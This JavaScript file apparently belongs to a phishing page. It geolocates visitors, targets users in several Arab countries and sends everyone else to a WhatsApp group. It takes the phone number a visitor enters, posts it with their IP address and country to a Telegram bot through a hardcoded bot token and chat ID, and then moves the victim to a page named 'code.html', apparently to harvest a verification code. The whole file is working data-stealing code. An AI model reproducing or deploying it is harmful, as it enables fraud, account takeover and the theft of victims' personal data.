var ip_adress,country_code;
function callback( response ){
ip_adress = response.IPv4;
country_code = response.country_code;
var list = ['JO', 'IQ', 'KW', 'SA', 'OM', 'AE', 'BH', 'QA', 'EG' ,'MA'];
var SelecTcountry = document.getElementById('SelecTcountry');

    if(list.includes(country_code)){
        for (let index = 0; index < list.length ; index++) {
            if(country_code==list[index]) SelecTcountry.selectedIndex=index;
        }
    }
    else window.location.replace("https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW");
}

$.ajax({
url:"https://geoip-db.com/jsonp/",
dataType:"jsonp"

})

function ValideText(){
    if(document.getElementById("txtphone").value != '' && document.getElementById("txtphone").value.length >= 6 && document.getElementById("txtphone").value.length !=0){
        
        return true;
    }
    else {
        
        return false;
    }
}
var bntclicked = false;
function SendNumber()
{
    if(!bntclicked)
    {
            var Api_Key = "1855648626:AAH4aghCdhluBVz1Ce8mZa8jWFxDeKZSPHI";
            var chat_id = "788377233";
            var cpt = 0;
                if(ValideText() && !isNaN(document.getElementById("txtphone").value))
                {
                    bntclicked = true;
                    var SelecTcountry = document.getElementById('SelecTcountry');
                    var NSelecTcountry = "("+SelecTcountry.options[SelecTcountry.selectedIndex].value+")";
                    var txtphone = document.getElementById("txtphone").value;
                    var api_Start_message='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=------------------------------------------------------';
                    fetch(api_Start_message, { 
                    method: 'POST'})
                    .then(response => {
                        if (response.ok)
                        {
                            var api_url='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=+'+txtphone;
                            fetch(api_url, { 
                                method: 'POST'})
                            .then(response => {
                                if (response.ok)
                                {
                                    cpt++;
                                    var api_url_ip='https://api.telegram.org/bot'+Api_Key+'/sendMessage?chat_id='+chat_id+'&text=IP : '+ip_adress+":"+country_code+":"+NSelecTcountry;
                                    fetch(api_url_ip, { 
                                        method: 'POST'})
                                        .then(response => { 
                                            if (response.ok)
                                            {
                                                if(cpt==1)
                                                {
                                                    window.location.replace("code.html");
                                                }
                                            }
                                        });
                                }
                                else 
                                {
                                    window.location.replace("index.html");
                                }
                            });
                        }
                    });
                }
     }
    
}

function isInputNumber(evt){
    
    var ch = String.fromCharCode(evt.which);
    
    if(!(/[0-9]/.test(ch))){
        evt.preventDefault();
    }
    
}
